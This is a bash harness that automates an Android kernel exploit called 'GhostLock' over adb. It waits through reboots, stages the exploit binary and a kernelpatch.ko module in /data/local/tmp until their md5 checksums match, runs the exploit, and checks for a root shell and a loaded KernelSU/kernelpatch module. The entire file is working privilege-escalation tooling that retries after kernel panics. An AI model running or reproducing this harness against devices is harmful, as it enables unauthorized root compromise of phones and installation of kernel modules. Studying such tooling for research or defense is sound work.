#!/bin/bash
# GhostLock reboot-retry loop: wait for boot -> stage binary + kernelpatch.ko
# -> run exploit -> check for root. Panics reboot the device and the loop
# continues; success (child is root! / kernelpatch module loaded) stops it.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/env.sh"
require_dev || exit 1

for r in $(seq 1 8); do
  echo "=== round $r start $(date +%H:%M:%S) ==="
  for i in $(seq 1 60); do
    st=$(adb -s $DEV shell 'echo ok' 2>/dev/null | tr -d '\r')
    [ "$st" = "ok" ] && break
    sleep 3
  done
  for i in $(seq 1 40); do
    bc=$(adb -s $DEV shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r')
    [ "$bc" = "1" ] && break
    sleep 3
  done
  sleep 5
  # /data/local/tmp rolls back to an old snapshot during early boot, so a
  # single push right after boot_completed gets overwritten. Verify md5 and
  # re-push until both files stick.
  EXPECT_BIN=$(md5sum "$BIN" | cut -d' ' -f1)
  EXPECT_KO=$(md5sum "$KO" | cut -d' ' -f1)
  for i in $(seq 1 8); do
    adb -s $DEV push "$BIN" /data/local/tmp/ghostlock >/dev/null 2>&1
    adb -s $DEV push "$KO" /data/local/tmp/kernelpatch.ko >/dev/null 2>&1
    adb -s $DEV shell 'chmod 755 /data/local/tmp/ghostlock; chmod 644 /data/local/tmp/kernelpatch.ko' 2>/dev/null
    sleep 8
    got=$(adb -s $DEV shell 'md5sum /data/local/tmp/ghostlock /data/local/tmp/kernelpatch.ko' 2>/dev/null | cut -d' ' -f1 | tr '\n' ' ')
    echo "round $r: staged [$got]"
    case "$got" in
      "$EXPECT_BIN $EXPECT_KO "*) break ;;
    esac
    sleep 5
  done
  timeout 220 adb -s $DEV shell 'cd /data/local/tmp && GHOSTLOCK_W1_ATTEMPTS=3 ./ghostlock' > "$LOGDIR/gl_retry_r${r}.log" 2>&1
  echo "ADB_EXIT=$?" >> "$LOGDIR/gl_retry_r${r}.log"
  if grep -q "child is root!" "$LOGDIR/gl_retry_r${r}.log"; then
    echo "=== SUCCESS at round $r ==="
    sleep 8
    adb -s $DEV shell 'grep -E "kernelsu|kernelpatch" /proc/modules; ls /data/adb/ap/ 2>/dev/null; cat /data/local/tmp/.ghostlock_ksu.log 2>/dev/null | tail -15'
    break
  fi
  tail -2 "$LOGDIR/gl_retry_r${r}.log" | sed 's/\^\[\[[0-9]*m//g'
  sleep 5
done
echo "=== retry loop done $(date +%H:%M:%S) ==="
